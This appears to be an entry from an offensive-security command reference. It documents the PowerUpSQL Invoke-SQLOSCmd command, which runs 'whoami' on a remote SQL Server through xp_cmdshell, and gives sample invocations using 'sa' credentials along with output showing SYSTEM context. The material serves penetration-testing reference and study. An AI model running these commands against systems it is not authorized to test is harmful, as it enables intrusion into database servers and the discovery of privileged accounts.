---
type: command
executor: powershell
data: >-
  Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance
  "$_INSTANCE" -Command whoami
output: null
platforms:
  - Windows
  - SQL Server
tags:
  - reconnaissance
  - command-execution
verified: true
validated: true
---

# invoke-sqloscmd-execute-whoami

## Command

```powershell
Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command whoami
```

## Description

This command uses the PowerUpSQL module to execute the 'whoami' OS command on a remote SQL Server host via xp_cmdshell, revealing the current user context under which SQL Server runs (often a privileged account like SYSTEM).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Username | SQL Server login username (e.g., sa) | Yes |
| -Password | SQL Server login password | Yes |
| -Instance | SQL Server instance name (e.g., DBSERVER\SQLEXPRESS) | Yes |
| -Command | The OS command to execute (here: whoami) | Yes |

## Examples

### Basic Usage

```powershell
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "DBSERVER\SQLEXPRESS" -Command whoami
```

### With Verbose Output

```powershell
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "DBSERVER\SQLEXPRESS" -Command whoami -Verbose
```

## Expected Output

Successful execution returns the current user, e.g.:

```
nt authority\system
```

Errors may include: "xp_cmdshell is disabled" or connection failures.

## Related

- [[procedures/mssql-command-execution-via-xp-cmdshell-with-invoke-sqloscmd]]
- [[tools/PowerUpSQL]]
